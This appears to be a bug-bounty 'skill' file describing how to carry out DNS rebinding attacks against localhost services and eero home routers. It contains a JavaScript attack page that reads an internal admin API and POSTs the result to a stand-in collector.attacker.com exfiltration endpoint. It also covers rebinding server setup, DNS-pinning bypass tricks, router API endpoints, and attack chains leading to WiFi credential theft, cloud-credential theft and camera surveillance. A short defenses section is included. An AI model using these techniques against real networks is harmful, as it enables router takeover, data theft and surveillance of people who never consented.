# DNS Rebinding Skill

**Trigger:** DNS rebinding, SOP bypass, localhost SSRF via browser, IoT attack, eero, internal API
**Payout Ceiling:** High ($2K–$10K) | **Target: eero specifically + any app accessing localhost**

---

## What Is DNS Rebinding

DNS rebinding exploits the browser's Same-Origin Policy by using DNS to reassign
a hostname from attacker's IP to victim's localhost (or internal network IP).

```
1. Victim visits attacker.com
2. attacker.com DNS resolves to 1.2.3.4 (attacker's IP) — normal
3. Attacker's server returns JavaScript
4. JavaScript makes request to attacker.com again
5. DNS TTL expires → attacker rebinds DNS to 127.0.0.1
6. Browser resolves attacker.com → 127.0.0.1
7. SOP satisfied (same origin!) → browser sends request to VICTIM'S localhost
8. Attacker reads response → internal API accessed
```

**Key insight:** Browser thinks it's still talking to attacker.com (same origin) but the TCP
connection goes to localhost. SOP is bypassed because the name didn't change, only the IP.

---

## Attack Scenarios

### Scenario 1: Access localhost Admin Panel
```
Target: App with unauthenticated admin panel on localhost:8080
Attack: DNS rebind to 127.0.0.1:8080 → read admin dashboard, extract credentials
Impact: High (internal service access)
```

### Scenario 2: eero IoT Router Attack
```
Target: eero (in BB scope) — home router API accessible at 192.168.4.1 or 10.0.0.1
Attack: DNS rebind to eero's local IP → access router admin API
- Read network config, connected devices, DNS settings
- Modify router settings (DNS poisoning, firewall disable)
Impact: High → network takeover
```

### Scenario 3: Cloud Metadata via Browser
```
Target: Web app that renders user-controlled content (SSRF blocked server-side)
Attack: Client-side DNS rebind → browser requests http://169.254.169.254/
Impact: AWS IMDSv1 credentials via browser (bypasses server-side SSRF filters)
```

### Scenario 4: WebSocket to Localhost Services
```
Target: Electron app / desktop app with local WebSocket server
Attack: DNS rebind → WebSocket connects to ws://localhost:PORT
- Read/write to the local WebSocket server
- Bypass any IP-based auth that allows 127.0.0.1
```

---

## Attack Implementation

### Step 1: Set Up DNS Rebinding Server
```bash
# Option 1: singularity (best tool for DNS rebinding attacks)
# github.com/nccgroup/singularity
git clone https://github.com/nccgroup/singularity
# Configure: singularity.conf → set rebind IP, port, interface

# Option 2: rbndr.us (public DNS rebinding service for testing)
# Domains like 7f000001.TARGET_IP.rbndr.us rebind between two IPs
# Use for quick testing / PoC demonstration

# Option 3: Custom DNS server
# Set TTL=1 on your domain, serve first request from your IP,
# all subsequent from 127.0.0.1 or target internal IP
```

### Step 2: Craft Attack Page
```html
<!-- Attacker's page at rebind.attacker.com -->
<script>
// Phase 1: This runs while DNS points to attacker's IP
// Do initial setup

// Phase 2: After rebind, fetch from localhost
function fetchInternalAPI() {
  fetch('http://rebind.attacker.com:8080/admin/users')  // DNS now → 127.0.0.1
    .then(r => r.json())
    .then(data => {
      // Exfil the internal API response
      fetch('https://collector.attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
}

// Wait for DNS TTL to expire and rebind to occur
setTimeout(fetchInternalAPI, 30000);  // Wait 30 seconds
</script>
```

### Step 3: Using rbndr.us for Quick PoC
```
# rbndr.us resolves alternately between two IPs based on request count
# Format: FIRST_IP_HEX.SECOND_IP_HEX.rbndr.us
# 7f000001 = 127.0.0.1 (hex)
# 0a000001 = 10.0.0.1 (hex)

# Example: domain that alternates between 1.2.3.4 and 127.0.0.1
01020304.7f000001.rbndr.us

# Visit: make first request (goes to 1.2.3.4 = your server)
# Next request: goes to 127.0.0.1 (localhost)
```

---

## eero-Specific Attack (In-Scope Target)

```javascript
// eero admin API typically accessible at 10.0.0.1 or 192.168.4.1
// Test discovery:
fetch('http://10.0.0.1/api/v1/network')           // eero main
fetch('http://192.168.4.1/api/v1/network')        // eero AP
fetch('http://eero.com/api/v1/gateways')          // cloud API

// After DNS rebind to 10.0.0.1:
fetch('http://rebind.attacker.com/api/v1/network')
// → reads eero network config, connected devices, firmware version
// → potentially: modify DNS servers, disable firewall, read wifi credentials
```

---

## Detection / Testing Without Full Setup

```bash
# Quick check: does the app's local API have no auth?
# If you can access it from same machine → DNS rebind will work from a browser

# Test localhost APIs manually first:
curl http://localhost:8080/admin/
curl http://localhost:8080/api/config
# If these return data without auth → DNS rebinding will exploit them from a remote browser
```

---

## Defenses (What Makes This Not Work)
- `Sec-Fetch-Site: cross-site` header → some apps check this
- Private Network Access (PNA) headers in Chrome 113+ — blocks rebinding to private IPs
- Requiring `Host: localhost` check on server (rebind sends `Host: attacker.com`)
- TLS with certificate pinning → rebind won't have valid cert for 127.0.0.1

**Important:** Chrome 113+ implements Private Network Access checks that make classic DNS
rebinding to private IPs harder. Test with older Chrome or Firefox.

---

## Report Evidence
- Video: Demonstrate the timing (DNS TTL expiry) and the successful cross-origin access
- Screenshot: Browser devtools Network tab showing request to attacker.com resolving to localhost
- Screenshot: Internal API response in browser
- Note: PoC may require specific timing conditions — document setup carefully

---

---

## Advanced Techniques (KB Part 2)

### Timing Optimization

**TTL Strategy:**
```bash
# Set your domain's TTL to 1 second (minimum allowed by most providers)
# Page waits TTL + 5 seconds before making the rebind request
# Typical attack window: 30-60 seconds for victim to sit on the page
```

**Browser DNS Cache Bypass:**
```
Chrome caches DNS for minimum 1 minute regardless of TTL setting.
Firefox respects low TTLs better — better for PoC demos.

Workarounds to force new DNS lookup in Chrome:
1. Reload the iframe — may trigger fresh DNS resolution
2. Use WebSocket: open WS connection, close it, re-open (forces DNS re-resolution)
3. Multiple A records technique (see below)
```

**Multiple A Records Technique:**
```
Return BOTH attacker IP and target internal IP in the same DNS response.
Browser tries attacker IP first. When connection to attacker IP fails (attacker server drops it),
browser retries with the next A record — which is 192.168.1.1 (internal target).
Browser may select internal IP automatically on retry without requiring full TTL expiry.
```

### Browser DNS Pinning Bypass Techniques
```
1. WebSockets maintain connection WITHOUT re-resolving DNS
   → Once WS connection is tunneled to internal IP, all WS messages go to internal host
   → No DNS pinning bypass needed — connection already established

2. Service Worker persists across DNS changes
   → Register SW while DNS points to attacker → SW intercepts future requests
   → Those requests route to wherever DNS currently points

3. Connection close/error to force re-resolution
   → Send RST packet or drop connection from attacker server
   → Browser forces new DNS lookup on retry → rebind to internal IP
```

### Singularity Tool (Full Setup)
```bash
# Complete DNS rebinding toolkit — handles DNS server + payload delivery
git clone https://github.com/nccgroup/singularity
# Features:
# - Auto-rebind management server
# - Built-in payload templates for routers, IoT, localhost APIs
# - Internal network scanner
# Configure: singularity.conf → set rebind target IP, interface, port

# PortSwigger's rebinder (simpler, JS-only):
# https://portswigger.net/research/writing-a-dns-rebinding-attack-in-javascript
```

### Additional Chain Paths

| Chain | Severity |
|-------|----------|
| DNS rebinding → router admin → DNS hijack → network-wide MITM | Critical |
| DNS rebinding → router password extract → WiFi infiltration | High |
| DNS rebinding + XSS → persistent browser-based network scanner | High |
| DNS rebinding → cloud metadata (169.254.169.254) → AWS credential theft | Critical |
| DNS rebinding → IoT camera RTSP stream access → physical surveillance | High |

### Tavis Ormandy eero Research
```
Tavis Ormandy (Google Project Zero) researched DNS rebinding against eero mesh routers.
eero devices expose a local management API accessible at 10.0.0.1 or 192.168.4.1.
DNS rebinding can access this API from a victim's browser without any user authentication.
Key endpoint targets: /api/v1/network, /api/v1/gateways, /api/v1/devices
Potential: read WiFi credentials, modify DNS, enumerate all connected devices
```

## References

- Singularity DNS rebinding framework: https://github.com/nccgroup/singularity
- NCC Group blog: https://www.nccgroup.com/us/research/singularity-of-origin-a-dns-rebinding-attack-framework/
- Tavis Ormandy eero research (Project Zero)
- PortSwigger rebinder: https://portswigger.net/research/writing-a-dns-rebinding-attack-in-javascript

---

*Enhanced by KB Part 2 ingestion 2026-03-04*

*Skill: dns-rebinding | Created 2026-03-04 | GAP-F from strategic study | eero in-scope target | Ceiling: High ($2K–$10K)*
